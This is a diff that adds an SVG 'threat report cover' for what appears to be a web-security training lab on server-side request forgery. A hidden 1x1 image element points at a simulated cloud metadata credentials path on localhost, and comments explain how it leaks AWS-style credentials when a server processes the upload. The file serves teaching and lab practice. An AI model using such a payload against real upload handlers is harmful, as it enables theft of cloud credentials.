@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  WA101 SSRF lab  malicious CTI report cover.
+  Looks like an ordinary vector logo, but embeds an external <image> reference.
+  When the server "processes" this upload, it resolves the href below and fetches
+  the simulated cloud metadata endpoint (SSRF), leaking AWS-style credentials.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="320" height="160" viewBox="0 0 320 160">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0" stop-color="#0e1117"/>
+      <stop offset="1" stop-color="#0284c7"/>
+    </linearGradient>
+  </defs>
+  <rect width="320" height="160" fill="url(#bg)"/>
+  <text x="18" y="70" font-family="Segoe UI, sans-serif" font-size="34" font-weight="bold" fill="#ffffff">CTI</text>
+  <text x="20" y="112" font-family="Segoe UI, sans-serif" font-size="12" fill="#ffffff">threat report cover</text>
+
+  <!-- SSRF payload: server-side resolver follows this href to internal metadata -->
+  <image x="0" y="0" width="1" height="1"
+         href="http://localhost:4321/latest/meta-data/iam/security-credentials/cti-uploader-role"
+         xlink:href="http://localhost:4321/latest/meta-data/iam/security-credentials/cti-uploader-role"/>
+</svg>
